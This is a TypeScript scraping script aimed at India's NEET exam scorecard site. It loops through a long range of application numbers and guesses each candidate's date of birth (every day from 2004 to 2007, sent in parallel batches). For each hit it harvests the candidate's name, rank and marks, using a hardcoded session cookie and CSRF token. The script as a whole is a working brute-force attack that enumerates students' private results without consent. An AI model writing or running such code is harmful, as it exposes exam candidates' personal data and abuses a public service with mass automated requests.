import axios from "axios";
import cheerio from "cheerio";
import qs from 'qs';
// import * as fs from 'fs';
// import * as path from 'path';

// const filePath = path.resolve(__dirname, 'list.json');

import "./list.json";
async function fetchResult(applicationNumber: string, day: string, month: string, year: string) {
    let data = qs.stringify({
        '_csrf-frontend': '0eWuzNoRUjL6S_wbEOGQTLrAbEZsdMxim70FfaI7Yb-4rtS0kSEAWJ4KqyxFvtQIg7kqNxklrSnIhXRP0lU12Q==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'advanced-frontend=88a6rqa00bo5sckgmf2shk2kc7; _csrf-frontend=eb6d1314f029304ad4b0bdbfdf64f8b6411f03579bc919893b53db3709d4e5d5a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22iKzxK0RjdAW7U_DD9yFquQaKS8q2pnTf%22%3B%7D',
            'DNT': '1',
            'Origin': 'null',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        },
        data: data
    };

    try {

        const response = await axios.request(config);
        const parsedHtmlContent = parseHTML(JSON.stringify(response.data));
        if (parsedHtmlContent) {
            return parsedHtmlContent

        }
    }
    catch (error) {
        return null
    }
}

function parseHTML(htmlContent: string) {
    const $ = cheerio.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';

    // Find the candidate's name
    const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';

    // Find the All India Rank
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';

    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

    // console.log(`Application Number: ${applicationNumber}`);
    // console.log(`Candidate's Name: ${candidateName}`);
    // console.log(`All India Rank: ${allIndiaRank}`);
    // console.log(`Marks: ${marks}`);

    if (allIndiaRank === 'N/A') {
        return null
    }
    return ({

        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    }
    )
}

async function findResults(applicationNumber: string) {
    let solved = false;
    for (let year = 2007; year > 2003; year--) {
        if (solved) {
            break;
        }
        for (let month = 2; month < 12; month++) {
            if (solved) {
                break;
            }
            const dataPromises = [];
            console.log("Sending request for: " + applicationNumber + " year: " + year + " month: " + month);

            for (let day = 1; day <= 31; day++) {
                // console.log("Processing: " + applicationNumber + " " + year + "-" + month + "-" + day);
                const data = fetchResult(applicationNumber, day.toString(), month.toString(), year.toString());
                dataPromises.push(data);
            }

            const resolvedData = await Promise.all(dataPromises);
            resolvedData.forEach(data => {
                if (data) {
                    console.log(data);
                    // fs.writeFile(filePath, JSON.stringify(data), 'utf8', (err) => {
                    //     if (err) {
                    //         console.error('Error writing the file:', err);
                    //     } else {
                    //         console.log('File has been updated successfully');
                    //     }
                    // });
                    solved = true;
                }
            });
        }

    }
}

async function main() {
    for (let appNumber = 240411345673; appNumber < 240411999999; appNumber++) {
        await findResults(appNumber.toString());
    }
}

main();


